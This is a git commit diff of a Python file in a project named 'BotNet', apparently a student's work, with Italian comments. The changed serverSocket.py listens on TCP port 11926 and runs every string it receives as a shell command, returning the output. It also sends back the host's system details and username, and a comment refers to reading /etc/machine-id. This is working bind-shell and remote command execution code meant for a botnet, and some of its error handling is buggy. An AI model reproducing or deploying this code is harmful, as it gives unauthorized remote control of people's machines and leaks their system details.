6117544f16e420ea7b6239a83a8723ef84493524
DarioUNINA <dari.franzese@studenti.unina.it>
2022-11-10 12:11:07 +0100

    server improvement

--- BotNet/serverSocket.py
+++ BotNet/serverSocket.py
@@ -5,52 +5,89 @@ from pathlib import Path
 import traceback
 import getpass
 
-#print(os.uname()) #sistema operativo e tipo di macchina
-#print(getpass.getpass()) #uguale a USER
+
+def connect():
+    serverPort = 11926
+    serverSocket = socket(AF_INET,SOCK_STREAM) #SOCK_STREAM = TCP
+                                                #socket(...) e' il costruttore della classe socket
+    serverSocket.bind( ('',serverPort) ) #collega la socket al port 1200
+                                        #la variabile passata e' una t-pla, indicata con la parentesi tonda e NON e' modificabile
+    serverSocket.listen(1) #si mette in ascolto, 1 indica la dimensione della coda dei client
+    print ('The server is ready to receive')
+
+    connectionSocket, addr = serverSocket.accept()
+    print('Accepted a new client', addr)
+
+    return serverSocket, connectionSocket
+
+#def setup_windows(connectionSocket):
 
 
-
-serverPort = 12000
-serverSocket = socket(AF_INET,SOCK_STREAM) #SOCK_STREAM = TCP
-                                            #socket(...) e' il costruttore della classe socket
-serverSocket.bind( ('',serverPort) ) #collega la socket al port 1200
-                                    #la variabile passata e' una t-pla, indicata con la parentesi tonda e NON e' modificabile
-serverSocket.listen(1) #si mette in ascolto, 1 indica la dimensione della coda dei client
-print ('The server is ready to receive')
+#def setup_Linux(connectionSocket):
 
 
-connectionSocket, addr = serverSocket.accept()
-print('Accepted a new client', addr)
-os.chdir(Path.home()) #cambio directory iniziale (su windows parte da System32, invece così dalla directory
-                      #dell'utente che apre il file)
+def setup(connectionSocket):
 
+    sys = os.uname() #sistema operativo e tipo di macchina
+    os.chdir(Path.home()) #cambio directory iniziale (su windows parte da System32, invece così dalla directory
+                        #dell'utente che apre il file)
 
-while True:
-    try:
-        cmd = connectionSocket.recv(1048576).decode(encoding='latin-1')
-        
-        if cmd == "esc":
-            break
+    connectionSocket.send(sys.encode(encoding='latin-1'))
+    connectionSocket.send(getpass.getuser().encode(encoding='latin-1'))
 
-        if cmd.startswith("cd") :
-            if not((cmd[2:]).isspace() or len(cmd)==2) :
-                os.chdir(cmd[3:])
-        
-            result = os.getcwd()
-        else:
-            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, encoding='latin-1').stdout
-            # result = subprocess.getoutput(cmd)
-            if result == '':
-                result = "comando non valido\n"
-        connectionSocket.send(result.encode(encoding='latin-1'))
-    except:
-        traceback.print_exc()
-        result = "errore"
-        connectionSocket.send(result.encode(encoding='latin-1'))
+    #if sys.sysname == "Windows":
+  #      setup_windows(connectionSocket)
 
-serverSocket.close()
-print("\nConnection closed\n")
+    #if sys.sysname == 'Linux': #aggiungere Mac
+   
+   #     setup_Linux(connectionSocket)
+
     
+
+
+
+
+def main():
+    
+    serverSocket, connectionSocket = connect()
+
+   # setup(connectionSocket)
+
+    while True:
+        try:
+            cmd = connectionSocket.recv(1048576).decode(encoding='latin-1')
+            
+            if cmd == "esc":
+                break
+
+            if cmd.startswith("cd") :
+
+                if not((cmd[2:]).isspace() or len(cmd)==2) :
+                    os.chdir(cmd[3:])
+            
+                result = os.getcwd()
+
+            else:
+
+                result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, encoding='latin-1').stdout
+
+                if result == '':
+                    result = "comando non valido\n"
+
+        except Exception:
+            result = "Errore: " + Exception.with_traceback()
+
+        finally:
+            connectionSocket.send(result.encode(encoding='latin-1'))
+
+
+    serverSocket.close()
+    print("\nConnection closed\n")
+    
+
+if __name__ == "__main__":
+    main()
+
 
 
 # cat /etc/machine-id -------- id macchina
